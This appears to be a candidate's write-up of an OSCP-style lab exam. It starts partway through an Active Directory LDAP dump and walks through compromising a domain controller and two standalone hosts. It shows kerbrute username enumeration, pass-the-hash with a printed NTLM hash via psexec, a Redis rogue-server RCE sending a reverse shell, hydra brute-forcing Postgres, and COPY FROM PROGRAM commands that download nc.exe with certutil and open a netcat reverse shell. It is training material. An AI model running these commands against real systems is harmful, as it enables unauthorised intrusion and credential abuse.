whenChanged: 20230228220851.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: SGzNix1N6k6zp18A8MPVQw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LC8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, oscp.exam
dn: CN=Cloneable Domain Controllers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: GdVMfoIvxkWsxdUU2+YDDA==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, oscp.exam
dn: CN=Protected Users,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: E+nCyG1Td0+VQlBJrGhXvg==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, oscp.exam
dn: CN=Key Admins,CN=Users,DC=oscp,DC=exam

# Enterprise Key Admins, Users, oscp.exam
dn: CN=Enterprise Key Admins,CN=Users,DC=oscp,DC=exam

# DnsAdmins, Users, oscp.exam
dn: CN=DnsAdmins,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220930.0Z
whenChanged: 20230228220930.0Z
uSNCreated: 12485
uSNChanged: 12487
name: DnsAdmins
objectGUID:: Oe3dyunrhEiS7XWp9p2AJg==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, oscp.exam
dn: CN=DnsUpdateProxy,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220930.0Z
whenChanged: 20230228220930.0Z
uSNCreated: 12490
uSNChanged: 12490
name: DnsUpdateProxy
objectGUID:: HD+3/9T1tEe3oYx/GGUFEw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z

# lisa, Users, oscp.exam
dn: CN=lisa,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: lisa
givenName: lisa
distinguishedName: CN=lisa,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228222638.0Z
whenChanged: 20230505174934.0Z
uSNCreated: 12820
uSNChanged: 32790
name: lisa
objectGUID:: Cpo+N7eUY0eRHOub0ybCBQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133220981487030052
pwdLastSet: 133277825748518040
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCTwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: lisa
sAMAccountType: 805306368
lockoutTime: 0
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133220973660458295
msDS-SupportedEncryptionTypes: 0

# betty, Users, oscp.exam
dn: CN=betty,CN=Users,DC=oscp,DC=exam

# svc_sql, Users, oscp.exam
dn: CN=svc_sql,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_sql
givenName: svc_sql
distinguishedName: CN=svc_sql,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228222639.0Z
whenChanged: 20240116195539.0Z
uSNCreated: 12836
uSNChanged: 61483
name: svc_sql
objectGUID:: dnO3wTapTE6GsHJr9zLVpA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133499098165696480
pwdLastSet: 133277825510807067
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCUQQAAA==
accountExpires: 9223372036854775807
logonCount: 13
sAMAccountName: svc_sql
sAMAccountType: 805306368
lockoutTime: 0
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133499085394659640
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.oscp.exam/DC=ForestDnsZones,DC=oscp,DC=exam

# search reference
ref: ldap://DomainDnsZones.oscp.exam/DC=DomainDnsZones,DC=oscp,DC=exam

# search reference
ref: ldap://oscp.exam/CN=Configuration,DC=oscp,DC=exam

# search result
search: 2
result: 0 Success

# numResponses: 31
# numEntries: 27
# numReferences: 3
```

4. Created user list 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ cat DCusers 
lisa
betty
svc_sql
```

![[Pasted image 20240620142554.png]]

5. Confirmed that users are valid with kerbrute
```
./kerbrute-l userenum DCusers --dc 192.168.108.100 --domain oscp.exam 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/20/24 - Ronnie Flathers @ropnop

2024/06/20 01:43:29 >  Using KDC(s):
2024/06/20 01:43:29 >   192.168.108.100:88

2024/06/20 01:43:29 >  [+] VALID USERNAME:       lisa@oscp.exam
2024/06/20 01:43:29 >  [+] VALID USERNAME:       betty@oscp.exam
2024/06/20 01:43:29 >  [+] VALID USERNAME:       svc_sql@oscp.exam
2024/06/20 01:43:29 >  Done! Tested 3 usernames (3 valid) in 0.255 seconds
```

![[Pasted image 20240620142715.png]]



6. After compromising 101 and 102, betty user ntlm hash was obtained. Confirmed this creds have smb access to DC. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ netexec smb 192.168.108.100 -u betty -H fa680f1c00205958367965bd2102e92c
SMB         192.168.108.100 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         192.168.108.100 445    DC01             [+] oscp.exam\betty:fa680f1c00205958367965bd2102e92c (Pwn3d!)
```

![[Pasted image 20240620145336.png]]

7. Login with impcaket-psexec 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ impacket-psexec -hashes 00000000000000000000000000000000:fa680f1c00205958367965bd2102e92c betty@192.168.108.100
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.108.100.....
[*] Found writable share ADMIN$
[*] Uploading file DSwklnPb.exe
[*] Opening SVCManager on 192.168.108.100.....
[*] Creating service tTsM on 192.168.108.100.....
[*] Starting service tTsM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![[Pasted image 20240620145446.png]]

8. Found proof.txt 
```
C:\Users\Administrator\Desktop> whoami
nt authority\system

C:\Users\Administrator\Desktop> type proof.txt
0f8104495d93a1791c37e6d8c74af439

C:\Users\Administrator\Desktop> ipconfig 
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254
```

![[Pasted image 20240620145604.png]]

## STANDALONE 1 - 110
1. Rustscan 
```
Open 192.168.108.110:22
Open 192.168.108.110:80
Open 192.168.108.110:6379
```

![[Pasted image 20240620164331.png]]

2. Nmap 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 22,80,6379 192.168.108.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 03:02 EDT
Nmap scan report for 192.168.108.110
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:83:fe:93:71:c9:bb:b7:f4:0d:cc:a3:eb:fe:74:55 (ECDSA)
|_  256 3a:ba:4a:c3:5a:19:54:03:a4:d8:79:b6:c0:f8:c0:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Index of /
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.75 seconds
```

![[Pasted image 20240620164409.png]]

3. Use two exploit to obtained foothold. 
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
https://github.com/Ridter/redis-rce
```
┌──(kali㉿kali)-[~/OSCP/exam/redis-rce]
└─$ python3 redis-rce.py -f ../redis-rogue-server/exp.so  -r 192.168.108.110 -p 6379 -L 192.168.49.108 -P 6379

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.108.110:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.108.110:6379
[*] Setting filename
[+] Accepted connection from 192.168.108.110:6379
[*] Start listening on 192.168.49.108:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.108.110:60552
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: r
[*] Open reverse shell...
[*] Reverse server address: 192.168.49.108
[*] Reverse server port: 80
[+] Reverse shell payload sent.
[*] Check at 192.168.49.108:80
[*] Clean up..
```

![[Pasted image 20240620164842.png]]

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.110] 50414
SHELL=/bin/bash script -q /dev/null
smith@oscp:/tmp$ 
```

4. Obtained local.txt
```
smith@oscp:/home/smith$ cat local.txt
cat local.txt
c10dd35eec560b4f9779a866979f189e
smith@oscp:/home/smith$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group defaul
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group de
    link/ether 00:50:56:8a:a1:1a brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.108.110/24 brd 192.168.108.255 scope global ens160
       valid_lft forever preferred_lft forever
```

![[Pasted image 20240620164956.png]]




## STANDALONE 2 - 111
1. Rustscan 
```
                                                                            
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ rustscan 192.168.108.111
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.108.111:80
Open 192.168.108.111:139
Open 192.168.108.111:135
Open 192.168.108.111:443
Open 192.168.108.111:445
Open 192.168.108.111:3389
Open 192.168.108.111:5357
Open 192.168.108.111:5432
Open 192.168.108.111:5985
Open 192.168.108.111:47001
Open 192.168.108.111:49665
Open 192.168.108.111:49664
Open 192.168.108.111:49667
Open 192.168.108.111:49669
Open 192.168.108.111:49670
Open 192.168.108.111:49666
Open 192.168.108.111:49668
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80,139,135,443,445,3389,5357,5432,5985,47001,49665,49664,49667,49669,49670,49666,49668 192.168.108.111

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 04:58 EDT
Initiating Ping Scan at 04:58
Scanning 192.168.108.111 [2 ports]
Completed Ping Scan at 04:58, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:58
Completed Parallel DNS resolution of 1 host. at 04:58, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:58
Scanning 192.168.108.111 [17 ports]
Discovered open port 139/tcp on 192.168.108.111
Discovered open port 445/tcp on 192.168.108.111
Discovered open port 443/tcp on 192.168.108.111
Discovered open port 135/tcp on 192.168.108.111
Discovered open port 3389/tcp on 192.168.108.111
Discovered open port 80/tcp on 192.168.108.111
Discovered open port 49668/tcp on 192.168.108.111
Discovered open port 47001/tcp on 192.168.108.111
Discovered open port 5357/tcp on 192.168.108.111
Discovered open port 5985/tcp on 192.168.108.111
Discovered open port 49664/tcp on 192.168.108.111
Discovered open port 49665/tcp on 192.168.108.111
Discovered open port 49667/tcp on 192.168.108.111
Discovered open port 5432/tcp on 192.168.108.111
Discovered open port 49669/tcp on 192.168.108.111
Discovered open port 49670/tcp on 192.168.108.111
Discovered open port 49666/tcp on 192.168.108.111
Completed Connect Scan at 04:58, 0.54s elapsed (17 total ports)
Nmap scan report for 192.168.108.111
Host is up, received syn-ack (0.27s latency).
Scanned at 2024-06-20 04:58:17 EDT for 0s

PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
443/tcp   open  https         syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5357/tcp  open  wsdapi        syn-ack
5432/tcp  open  postgresql    syn-ack
5985/tcp  open  wsman         syn-ack
47001/tcp open  winrm         syn-ack
49664/tcp open  unknown       syn-ack
49665/tcp open  unknown       syn-ack
49666/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49668/tcp open  unknown       syn-ack
49669/tcp open  unknown       syn-ack
49670/tcp open  unknown       syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds    
```

![[Pasted image 20240620192733.png]]

2. Nmap 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 80,139,135,443,445,3389,5357,5432,5985,47001,49665,49664,49667,49669,49670,49666,49668 192.168.108.111
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 04:58 EDT
Nmap scan report for 192.168.108.111
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          BarracudaServer.com (Windows)
| http-webdav-scan: 
|   Server Date: Thu, 20 Jun 2024 09:01:44 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: BarracudaServer.com (Windows)
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Jun 2024 08:58:48 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Jun 2024 08:58:49 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Jun 2024 08:58:41 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Jun 2024 08:58:42 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 20 Jun 2024 08:59:58 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/https     BarracudaServer.com (Windows)
|_ssl-date: 2024-06-20T09:01:51+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| fingerprint-strings: 
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Jun 2024 08:59:02 GMT
|     Server: BarracudaServer.com (Windows)
|_    Connection: Close
|_http-server-header: BarracudaServer.com (Windows)
| http-webdav-scan: 
|   Server Date: Thu, 20 Jun 2024 09:01:30 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: BarracudaServer.com (Windows)
|_http-title: Home
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2024-04-25T13:41:18
|_Not valid after:  2024-10-25T13:41:18
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-20T09:01:30+00:00
|_ssl-date: 2024-06-20T09:01:51+00:00; +1s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5432/tcp  open  postgresql    PostgreSQL DB 9.6.0 or later
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=6/20%Time=6673EF40%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Jun\x202
SF:024\x2008:58:41\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\
SF:)\r\nConnection:\x20Close\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\
SF:x20OK\r\nDate:\x20Thu,\x2020\x20Jun\x202024\x2008:58:42\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r
SF:\n")%r(RTSPRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x2
SF:0Jun\x202024\x2008:58:42\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\
SF:(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(FourOhFourRequest,72,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Jun\x202024\x2008:58:48\
SF:x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:
SF:\x20Close\r\n\r\n")%r(GenericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\
SF:x20Thu,\x2020\x20Jun\x202024\x2008:58:49\x20GMT\r\nServer:\x20Barracuda
SF:Server\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(SIPOptio
SF:ns,13C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2020\x20Ju
SF:n\x202024\x2008:59:58\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Wi
SF:ndows\)\r\nConnection:\x20Close\r\nContent-Type:\x20text/html\r\nCache-
SF:Control:\x20no-store,\x20no-cache,\x20must-revalidate,\x20max-age=0\r\n
SF:\r\n<html><body><h1>400\x20Bad\x20Request</h1>Can't\x20parse\x20request
SF:<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=6/20%Time=6673EF56%P=x86_64-pc-linux-
SF:gnu%r(RTSPRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20
SF:Jun\x202024\x2008:59:02\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(
SF:Windows\)\r\nConnection:\x20Close\r\n\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-20T09:01:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.02 seconds
```

3. Run hydra against postgres port and found creds. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.108.111 postgres
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-20 05:58:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking postgres://192.168.108.111:5432/
[5432][postgres] host: 192.168.108.111   login: postgres   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-20 05:59:13
```

![[Pasted image 20240620192911.png]]

4. Psql login using obtained credentials. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ psql -h 192.168.108.111 -p 5432 -U postgres
Password for user postgres: 
psql (16.3 (Debian 16.3-1), server 15.2)
Type "help" for help.

postgres=# 
```

![[Pasted image 20240620193035.png]]

5. Perform postgres command execution. Firstly upload nc64.exe and use it to get reverse shell.  [Informational Nuggets - Hacking and Development (pollevanhoof.be)](https://pollevanhoof.be/nuggets/SQL_injection/postgres_command_execution)
```
postgres=# CREATE TABLE my_evil_table(cmd_output text);
CREATE TABLE
postgres=# COPY my_evil_table FROM PROGRAM 'certutil -urlcache -f http://192.168.49.108/nc64.eC:\Users\Public\nc.exe';
COPY 2
postgres=# COPY my_evil_table FROM PROGRAM 'C:\Users\Public\nc.exe 192.168.49.108 80 -e cmd';
```

![[Pasted image 20240620193242.png]]
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ sudo nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.111] 49702
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\PostgreSQL\15\data>
```

![[Pasted image 20240620193344.png]]

6. Obtained local.txt
```
C:\Users\devon\Desktop>type local.txt
type local.txt
b1d26111f9ff7ec50ff81d6d143bcc18

C:\Users\devon\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.108.111
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.108.254
```

![[Pasted image 20240620193630.png]]


7. From port 80, find out BarracudaDrive v6.5 was running. It has publically available epxloit. 
https://192.168.108.111/rtl/about.lsp
https://www.exploit-db.com/exploits/48789

8. Check out bd services and using it for privilege escalation. 
```
C:\>icacls C:\bd
icacls C:\bd
C:\bd NT AUTHORITY\NETWORK SERVICE:(OI)(CI)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
      BUILTIN\Administrators:(I)(OI)(CI)(F)
      BUILTIN\Users:(I)(OI)(CI)(RX)
      BUILTIN\Users:(I)(CI)(AD)
      BUILTIN\Users:(I)(CI)(WD)
      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

![[Pasted image 20240620193731.png]]

9. Check running services names. Before that run 'powerhsell -exec bypass' command. 
```
PS C:\bd> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                   State   PathName                                                                                
----                   -----   --------                                                                                
bd                     Running "C:\bd\bd.exe"                                                                          
BFE                    Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p                     
BrokerInfrastructure   Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                        
CDPSvc                 Running C:\Windows\system32\svchost.exe -k LocalService -p                                      
CertPropSvc            Running C:\Windows\system32\svchost.exe -k netsvcs                                              
COMSysApp              Running C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}       
CoreMessagingRegistrar Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p                             
CryptSvc               Running C:\Windows\system32\svchost.exe -k NetworkService -p                                    
DcomLaunch             Running C:\Windows\system32\svchost.exe -k DcomLaunch -p                                        
Dhcp                   Running C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                     
DiagTrack              Running C:\Windows\System32\svchost.exe -k utcsvc -p                                            
